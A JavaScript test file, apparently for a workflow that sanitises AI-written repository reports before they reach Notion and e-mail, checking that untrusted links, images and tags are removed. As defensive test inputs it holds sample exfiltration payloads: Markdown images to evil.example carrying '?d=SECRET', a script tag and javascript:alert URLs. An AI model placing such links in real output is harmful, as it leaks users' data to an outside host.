// Code nodes "Validate and Finalize Diagnostic" and "Render Report": what the AI answer may contain before it reaches Notion and the e-mail.
import test from 'node:test';
import assert from 'node:assert/strict';
import { evaluate, node } from './harness.mjs';
import { DOCS, EVIDENCE, GOAL, INDEX, RATING, REPO, answer, render, report, validate, verdict } from './fixtures.mjs';

test('a valid answer is kept, with the links to the examined repository', async () => {
  const result = await validate(answer());
  assert.equal(result.failed, false, result.failureReason);
  assert.equal(result.diagnostic.status, 'done');
  assert.equal(result.diagnostic.report.compatibility.windows.evidence, `${REPO}/blob/v1/README.md#install`);
  assert.deepEqual(result.diagnostic.sources.map(s => s.url), [`${REPO}/releases/tag/v1`]);
  assert.equal(result.diagnostic.repository.versionKind, 'stable release');
});

test('repository, version and URL come from GitHub, never from the AI', async () => {
  const result = await validate(answer({ report: report({ version: 'v9', url: 'https://example.org' }) }));
  assert.equal(result.diagnostic.report.version, 'v1');
  assert.equal(result.diagnostic.report.url, REPO);
});

const usefulness = async text => (await validate(answer({ report: report({ usefulness: text }) }))).diagnostic.report.usefulness;

test('images, Markdown links to unknown addresses, reference-style images and HTML-like tags written by the AI are removed', async () => {
  const text = await usefulness('Utile ![](https://evil.example/c.png?d=SECRET) ![x][r] voir [guide](https://evil.example/x?d=SECRET) <script>x</script> et torch>=2.7,<2.12.0\n[r]: https://evil.example/ref.png');
  assert.doesNotMatch(text, /evil\.example|SECRET|<script|!\[|\]\[/);
  assert.match(text, /voir guide ‹script>x‹\/script> et torch>=2\.7,<2\.12\.0/, 'the label of a link is kept, tags are neutralised, version ranges are not damaged');
});

test('a Markdown link to an address that the inputs contain stays a link', async () => {
  assert.equal(await usefulness(`voir [la doc](${DOCS}) ou [le dépôt](${REPO}/issues/12)`), `voir [la doc](${DOCS}) ou [le dépôt](${REPO}/issues/12)`);
  assert.equal(await usefulness(`voir [la doc](${DOCS.toUpperCase()})`), `voir [la doc](${DOCS.toUpperCase()})`, 'case does not matter');
  assert.equal(await usefulness('voir [autre doc](https://other.example/doc)'), 'voir autre doc');
});

test('a plain URL is kept, whether the inputs contain it or not: commands stay usable', async () => {
  const command = 'pip install lerobot==0.6.1 torch --index-url https://download.pytorch.org/whl/cpu';
  assert.equal(await usefulness(command), command);
  assert.equal(await usefulness(`la doc est ${DOCS}. L'index est ${INDEX}, voir ${REPO}/issues/12 et https://www.notion.so/decision-1.`), `la doc est ${DOCS}. L'index est ${INDEX}, voir ${REPO}/issues/12 et https://www.notion.so/decision-1.`);
});

test('sources and alternative links are kept when the inputs contain their address, and emptied otherwise', async () => {
  const withAlternatives = report({ existingAndAlternatives: { knownEquivalents: [], conclusion: 'c', externalAlternatives: [
    { name: 'doc', url: DOCS, justification: 'j' }, { name: 'click', url: 'https://evil.example', justification: 'j' }, { name: 'faux dépôt', url: 'https://github.com/acme/tool-evil', justification: 'j' }] } });
  const result = await validate(answer({ report: withAlternatives, sources: [
    { url: `${REPO}/releases/tag/v1`, type: 'github', usage: 'u' }, { url: DOCS, type: 'web', usage: 'u' }, { url: 'https://evil.example/s', type: 'web', usage: 'u' }] }));
  assert.deepEqual(result.diagnostic.report.existingAndAlternatives.externalAlternatives.map(a => a.url), [DOCS, '', '']);
  assert.deepEqual(result.diagnostic.sources.map(s => s.url), [`${REPO}/releases/tag/v1`, DOCS]);
  assert.match(result.diagnostic.unknowns.join(), /not part of the inputs/);
});

test('when no cited source is an address of the inputs, the examined version is the source', async () => {
  const result = await validate(answer({ sources: [{ url: 'https://evil.example/s', type: 'web', usage: 'u' }] }));
  assert.equal(result.failed, false, result.failureReason);
  assert.deepEqual(result.diagnostic.sources.map(s => s.url), [`${REPO}/releases/tag/v1`]);
  assert.match(result.diagnostic.unknowns.join(), /not part of the inputs/);
});

test('an address written by the AI with a trailing full stop is still recognised', async () => {
  const result = await validate(answer({ unknowns: [`voir ${REPO}/issues/12 et https://www.notion.so/decision-1.`, `[doc](${DOCS}).`] }));
  assert.equal(result.diagnostic.unknowns[0], `voir ${REPO}/issues/12 et https://www.notion.so/decision-1.`);
  assert.equal(result.diagnostic.unknowns[1], `[doc](${DOCS}).`);
});

test('the checks stay strict: no source, unknown context id, wrong repository, bad rating, no report, failed AI call', async () => {
  const cases = {
    'no source cited': answer({ sources: [] }),
    'not part of the provided': answer({ usedContext: [{ id: 'profile-9', usage: 'u' }] }),
    'repository differs': answer({ report: report({ repository: 'other/thing' }) }),
    'out of range': answer({ report: report({ ratings: { ...report().ratings, cost: { ...RATING, value: 9 } } }) }),
    'report is missing': answer({ report: undefined }),
    'AI call failed': { error: { message: 'service unavailable' } },
  };
  for (const [reason, input] of Object.entries(cases)) {
    const result = await validate(input);
    assert.equal(result.failed, true, reason);
    assert.match(result.failureReason, new RegExp(reason), reason);
    assert.equal(result.diagnostic.status, 'failed');
    assert.equal(result.diagnostic.report, null);
  }
});

test('the reuse key written with the report is the key looked up by the next request', async () => {
  const { diagnostic } = await validate(answer());
  const lookup = node('Data Table - Find Existing Analysis').parameters.filters.conditions.find(c => c.keyName === 'reuseKey').keyValue;
  assert.equal(evaluate(lookup, { json: EVIDENCE, nodes: { 'Set - Parse and Validate Request': { goal: GOAL } } }), diagnostic.trace.reuseKey);
});

test('the report is rendered as a Notion page and an e-mail, a failure too', async () => {
  const done = await render((await validate(answer())).diagnostic);
  assert.match(done.title, /Analyse — acme\/tool/);
  assert.match(done.markdownForNotion, /## acme\/tool @ v1/);
  assert.match(done.emailHtml, /__NOTION_BLOCK__/);
  assert.match(done.subject, /^Diagnostic — acme\/tool$/);
  const failed = await render((await validate({ error: { message: 'service unavailable' } })).diagnostic);
  assert.match(failed.subject, /^Échec du diagnostic/);
  assert.match(failed.tldr, /^Échec : AI call failed/);
});

test('the e-mail never links to anything but https', async () => {
  const { diagnostic } = await validate(answer());
  const tampered = structuredClone(diagnostic);
  tampered.sources = [{ url: 'javascript:alert(1)', usage: 'x' }];
  tampered.report.url = 'javascript:alert(2)';
  tampered.report.existingAndAlternatives.externalAlternatives = [{ name: 'click', url: 'javascript:alert(3)', justification: 'j' }];
  tampered.report.compatibility.windows.evidence = 'javascript:alert(4)';
  const { emailHtml } = await render(tampered);
  assert.doesNotMatch(emailHtml, /href="javascript:/i);
});

test('a non-https address in an evidence field is shown as text, never as a link', async () => {
  const result = await validate(answer({ report: report({ compatibility: { ...report().compatibility, windows: verdict('ok', 'javascript:alert(4)') } }), unknowns: ['x'] }));
  const { emailHtml } = await render(result.diagnostic);
  assert.doesNotMatch(emailHtml, /href="javascript:/i);
});
